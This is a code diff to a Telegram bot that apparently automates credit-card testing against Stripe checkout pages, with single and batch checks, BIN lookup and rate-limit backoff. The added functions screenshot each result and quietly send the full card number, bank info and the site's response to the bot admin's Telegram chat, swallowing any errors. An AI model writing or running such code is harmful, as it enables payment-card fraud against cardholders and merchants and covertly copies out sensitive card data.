@@ -3612,6 +3612,45 @@ def _fill_zip_outside_stripe_if_present(driver, zip_code: str) -> None:
         except Exception:
             continue
 
+# ---------- ST admin screenshot helpers ----------
+def _st_md_safe(s: str) -> str:
+    # This codebase uses parse_mode="Markdown" widely without escaping; keep it simple + safe-ish.
+    return (s or "").replace("`", "'")
+
+async def _st_send_admin_screenshot(
+    bot: "Bot",
+    driver,
+    caption: str,
+) -> None:
+    """
+    Best-effort: capture a screenshot and send it to BOT_ADMIN_ID.
+    (Used for /st "response capture" screenshots.)
+    """
+    if not driver:
+        return
+    tmp_path = None
+    try:
+        # Unique per-process/per-call to avoid collisions across multiprocessing workers
+        with tempfile.NamedTemporaryFile(prefix=f"st_{os.getpid()}_", suffix=".png", delete=False) as f:
+            tmp_path = f.name
+        driver.save_screenshot(tmp_path)
+        with open(tmp_path, "rb") as photo:
+            await bot.send_photo(
+                chat_id=BOT_ADMIN_ID,
+                photo=photo,
+                caption=(caption or "")[:950],  # keep under Telegram caption limits
+                parse_mode="Markdown",
+            )
+    except Exception:
+        # Don't let admin reporting break the user flow
+        pass
+    finally:
+        try:
+            if tmp_path and os.path.exists(tmp_path):
+                os.remove(tmp_path)
+        except Exception:
+            pass
+
 # ---------- SINGLE CARD ----------
 async def st_single_main(card_input, update_dict):
     uid = update_dict["user_id"]
@@ -3718,6 +3757,19 @@ async def st_single_main(card_input, update_dict):
                     f"🧑‍💻 **Checked by:** **{username}** [`{uid}`]"
                 )
                 await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=result_msg, parse_mode="Markdown")
+                # Send screenshot to admin when response is captured
+                try:
+                    admin_caption = (
+                        "ST Response Capture\n"
+                        f"💳 `{full_card}`\n"
+                        f"🏦 `{bin_info}`\n"
+                        f"📟 {emoji} **{status}**\n"
+                        f"📩 `{_st_md_safe(response_text)[:320]}`\n"
+                        f"🧑‍💻 {username} [`{uid}`]"
+                    )
+                    await _st_send_admin_screenshot(bot, driver, admin_caption)
+                except Exception:
+                    pass
                 return
 
             except Exception as e:
@@ -3725,7 +3777,18 @@ async def st_single_main(card_input, update_dict):
                     await bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
                         text=f"❌ Failed after 3 attempts.\nError: `{str(e)}`",
                         parse_mode="Markdown")
-                    # No screenshots: send trace to admin as text (best-effort)
+                    # Send screenshot + trace to admin (best-effort)
+                    try:
+                        admin_caption = (
+                            "ST Error (after 3 attempts)\n"
+                            f"💳 `{full_card}`\n"
+                            f"🏦 `{bin_info}`\n"
+                            f"📩 `{_st_md_safe(str(e))[:320]}`\n"
+                            f"🧑‍💻 {username} [`{uid}`]"
+                        )
+                        await _st_send_admin_screenshot(bot, driver, admin_caption)
+                    except Exception:
+                        pass
                     try:
                         await bot.send_message(
                             chat_id=BOT_ADMIN_ID,
@@ -3843,6 +3906,20 @@ async def st_batch_main(cards, update_dict):
             if not response_text:
                 response_text = "Unknown"
 
+            # Send screenshot to admin when response is captured (per card)
+            try:
+                emoji = "✅" if status == "Approved" else "❌"
+                admin_caption = (
+                    "ST Response Capture (batch)\n"
+                    f"💳 `{full_card}`\n"
+                    f"📟 {emoji} **{status}**\n"
+                    f"📩 `{_st_md_safe(response_text)[:320]}`\n"
+                    f"🧑‍💻 {username} [`{uid}`]"
+                )
+                await _st_send_admin_screenshot(bot, driver, admin_caption)
+            except Exception:
+                pass
+
             # If site says "too soon", back off & retry this same card once
             if _is_too_soon(response_text):
                 backoff = min(int(adaptive_delay * 1.5) + 2, MAX_DELAY)
@@ -3905,7 +3982,15 @@ async def st_batch_main(cards, update_dict):
 
     except Exception:
         await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="❌ Process failed.", parse_mode="Markdown")
-        # No screenshots: send trace to admin as text (best-effort)
+        # Send screenshot + trace to admin (best-effort)
+        try:
+            await _st_send_admin_screenshot(
+                bot,
+                driver if "driver" in locals() else None,
+                "ST Batch Error (screenshot)",
+            )
+        except Exception:
+            pass
         try:
             await bot.send_message(
                 chat_id=BOT_ADMIN_ID,
